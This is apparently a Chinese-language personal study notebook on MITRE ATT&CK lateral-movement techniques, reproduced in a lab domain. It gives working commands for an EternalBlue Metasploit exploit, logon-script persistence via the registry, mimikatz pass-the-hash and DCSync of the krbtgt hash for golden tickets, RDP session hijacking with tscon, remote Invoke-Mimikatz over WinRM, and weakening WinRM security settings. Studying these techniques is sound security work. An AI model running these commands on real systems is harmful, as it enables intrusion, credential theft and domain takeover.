# Lateral Movement

## AppleScript

 MACOS

## Application Deployment Software-T1017

严格来说这是一种思路，而不是一种具体形式的攻击

简单来说就是通过控制网络中的分发软件控制台，将恶意代码嵌入到原本需要分发给内网主机的软件中。

比如一个内网中存在终端管理系统，攻击者攻破了终端管理系统的服务器，则可以通过这个服务器分发控制端至内网主机上。

## 未完成Distributed Component Object Model-T1175

COM组件主要是说攻击者可能会使用COM组件和DCOM（分布式组件对象模型）进行本地代码执行，或者是作为远程移动的一部分在远程系统上执行。

https://ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model

## Exploitation of Remote Services-T1210

攻击远程服务，其中提到了比如SMB和RDP的一些CVE漏洞，还有一些MySQL等的远程服务的漏洞。比如最著名的MS17-010和今年的RDP的远程代码执行漏洞。

MS17010直接使用MSF就可以利用,网上已退

```
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set rhost 192.168.144.130
exploit
```

## Logon Scripts-T1037

Windows中允许在特定用户或用户组在登录系统时运行登录脚本。也就是开机自启动脚本，一般情况下用来权限维持，原文中提到的关于横向渗透的场景是在一个中央服务器中，其他主机会定时来请求脚本并执行的情况。

![1574328137025](Lateral%20Movement.assets/1574328137025.png)

运行修改注册表的bat文件，执行命令修改注册表，然后再次重新登录时设定的UserInitMprLogonScript的值会被执行（也就是c:\run_calc.bat）。

命令为：

```
REG.exe ADD HKEY_CURRENT_USER\Environment /v UserInitMprLogonScript /t REG_SZ /d "c:\run_calc.bat"
```

同时UserInitMprLogonScript的值是可以直接设置为命令的。

![1574328195643](Lateral%20Movement.assets/1574328195643.png)

## Pass the Hash-T1075

Pass the Hash是指通过已经有的HASH值来进行hash传递获得目标主机的访问权限。

例如在其他主机中想要访问0m0a1.com域中的主机dc.0m0a1.com,那么可以使用mimikatz进行PTH的攻击。

![1574328241859](Lateral%20Movement.assets/1574328241859.png)

```
mimikatz#privilege::debug
mimikatz#sekurlsa::pth /user:administrator /domain:0m0a1.com /ntlm: 4cb55ea6471d29ccbb2ce4cf00271fe3
```

![1574328257831](Lateral%20Movement.assets/1574328257831.png)

同样还有Wmiexec等其他工具也可以实现相同的功能：

![1574328359528](Lateral%20Movement.assets/1574328359528.png)

像crackmapexec工具还可以批量进行试探。

## Pass the Ticket-T1097

Pass the ticket是指在kerberos协议中使用的票据传递攻击

票据传递攻击，两种，黄金票据和白银票据

**黄金票据**

黄金票据其实就是伪造的TGT，因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST，黄金票据的条件要求：

```
1.域名称 
2.域的SID值 
3.域的KRBTGT账户NTLM hash
4.伪造用户名，直接写了administrator，可以是任意的
```

假如在上一步获得了权限之后，可以通过dcsync攻击获取指定账户的HASH值

```
lsadump::dcsync /domain:0m0a1.com /user:krbtgt
```

这里会向域控请求krbtgt账户的hash值

![1574328478292](Lateral%20Movement.assets/1574328478292.png)

然后抓到ktbtgt的NTLM hash之后之后生成黄金票据（TGT 由ktbtgt HASH加密sessionkey-as和TimeStamp），这个过程是不与TGS进行KDC进行交互的

![1574328487038](Lateral%20Movement.assets/1574328487038.png)

![1574328503885](Lateral%20Movement.assets/1574328503885.png)

这样的方式导入的票据20分钟之内生效，如果过期再次导入就可以，只要krbtgt的账号不变，通常情况下是和域控的账密一样，但是不会随域控管理员密码改变而改变

![1574328510920](Lateral%20Movement.assets/1574328510920.png)

## Remote Desktop Protocol-T1076

通过RDP协议进行的攻击，主要提到了RDP的劫持和通过窃取域管理员或者更高权限的账户会话来提升权限。

想要理解RDP的劫持，首先通过RDP登陆一台主机，在退出之后查看windows任务管理器可以看到之前的记录

![1574328537700](Lateral%20Movement.assets/1574328537700.png)

也可以通过query user在命令行查看

![1574328545759](Lateral%20Movement.assets/1574328545759.png)

这时可以通过tscon命令切换到已经断开连接的用户界面，Tscon的作用就是将用户会话连接到远程桌面会话。

![1574328559009](Lateral%20Movement.assets/1574328559009.png)

此时有两种可能：

1、 有本地system权限，那么可以直接使用tscon 2跳转到session 2（testwin7）的桌面

使用psexec64.exe –s cmd创建一个system权限的cmd窗口。

![1574328575986](Lateral%20Movement.assets/1574328575986.png)

![1574328584828](Lateral%20Movement.assets/1574328584828.png)

2、 没有本地system权限，需要使用密码才能跳转

![1574328595004](Lateral%20Movement.assets/1574328595004.png)

命令执行成功之后会直接从administrator的桌面跳转到session 2 也就是testwin7的桌面

![1574328603868](Lateral%20Movement.assets/1574328603868.png)

## Remote File Copy-T1105

说明了再横向渗透中可以通过一些SMB等协议，或者是FTP协议等进行横向移动，这种复制一般是需要账号密码，或者是需要未授权、本地以及有了Session的情况。

比如Windows下通过SMB协议进行远程复制：

```
cp \\hostA\c$\aaa.txt c:\
```

使用上面的命令就可以把远程主机hostA上C盘的aaa.txt文件复制到本地c盘。

## Remote Services-T1021

原文说的是“远程服务，指攻击者可以使用有效的账户，登录远程服务”。比如SSH、Telnet等。但是个人认为在实际环境中在遇到SSH、Telnet之类的情况应该大部分需要进行暴力破解。

## Replication Through Removable Media-T1091

通过可移动媒体，主要是说通过USB或者U盘等设备来进行感染病毒。比如比较有名的Bad USB，在U盘插入电脑的时候就会自动执行恶意程序。

https://www.freebuf.com/sectool/107242.html

在Freebuf上有比较详细的复现方法，这里因为需要硬件，所以我没有复现。

## Shared Webroot-T1051

Webroot是ASP.NET WEB应用程序的根目录，攻击者通过Webroot或者是Web内容目录开放网络文件共享将恶意内容（比如一个webshell）添加到内部可访问的网站，然后使用Web浏览器访问上传的webshell使服务器执行恶意内容。

![1574332242527](Lateral%20Movement.assets/1574332242527.png)

但是实际上C盘对外部开放的情况还是比较小的

## （未完成）SSH Hijacking-T1184

SSH劫持

1、 劫持screen会话

Screen命令可以创建后台运行的会话

这里是通过root通过su – testuser和screen –r 4772.pts-4.kali跳转到了testuser创建的screen会话中。但是从root到testuser的意义是什么？

![1574332297450](Lateral%20Movement.assets/1574332297450.png)

## Taint Shared Content-T1080

指一些污染共享的例子，比如公司的FTP服务器等，通过隐藏文件或者是目录隐藏等方式。个人认为算一种思路而不是一种技术。

## Third-party Software-T1072

攻击第三方软件，如客户端管理软件。个人认为算一种思路而不是一种技术。

## Windows Admin Shares-T1077

通过Admin Shares共享，默认情况下IPC$和ADMIN$是访问不了的，通过net use访问一般情况下需要输入账号密码。存在一种情况是发起请求的主机中已经保存了曾经访问过的session值，那么就可以根据已经有的session值去访问。

同时也可以通过PTH、PTT的方式。

## Windows Remote Management-T1028

WINRM是WS-Management协议的Microsoft实现，该协议的目的是为跨多种类型的设备（包括固件）和操作系统的管理操作提供一致性和互操作性。WS-Management协议的当前实现基于以下标准规范：HTTPS，HTTP上的SOAP（WS-I配置文件），SOAP 1.2，WS-Addressing，WS-Transfer，WS-Enumeration和WS-Eventing。

在拥有本地管理员权限以及目的的权限的情况下可以通过WINRM的WSMAN进行执行命令：

```powershell
Invoke-Command -ComputerName exchange2012 -ScriptBlock {ipconfig}
```

![1574333040602](Lateral%20Movement.assets/1574333040602.png)

```powershell
Invoke-Command -ComputerName exchange2012 -ScriptBlock {whoami}
```

![1574333045835](Lateral%20Movement.assets/1574333045835.png)

通过抓包可以看到走的主要是HTTP协议，命令以及执行结果的传输全部进行了加密:

![1574333076975](Lateral%20Movement.assets/1574333076975.png)

![1574333082062](Lateral%20Movement.assets/1574333082062.png)

同时mimikatz还支持使用WINRM进行远程获取LSASS中存储的hash值:

```powershell
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -ComputerName exchange2012
```

![1574333109782](Lateral%20Movement.assets/1574333109782.png)

同时也可以用于持久化，将原本没有开启WINRM的主机使用下列命令开启:

```powershell
Enable-PSRemoting –Force
```

![1574333138165](Lateral%20Movement.assets/1574333138165.png)

在一些情况下可能无法通过WinRM连接，就是说明需要做一些其他的配置:

```powershell
winrm quickconfig
winrm set winrm/config/Client @{AllowUnencrypted = "true"}
Set-Item WSMan:localhost\client\trustedhosts -value *
```
